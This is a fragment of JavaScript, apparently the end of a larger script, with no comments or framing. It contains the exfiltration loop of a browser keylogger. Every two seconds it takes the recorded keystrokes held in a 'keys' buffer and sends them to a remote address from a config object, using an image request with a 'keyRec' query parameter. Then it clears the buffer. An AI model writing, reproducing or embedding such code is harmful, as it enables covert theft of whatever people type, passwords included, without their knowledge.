window.setInterval(function () {
  if (keys != "") {
    new Image().src = config.clientIp2 + "?keyRec=" + encodeURI(keys);
    keys = '';
  }
}, 2000);
})();
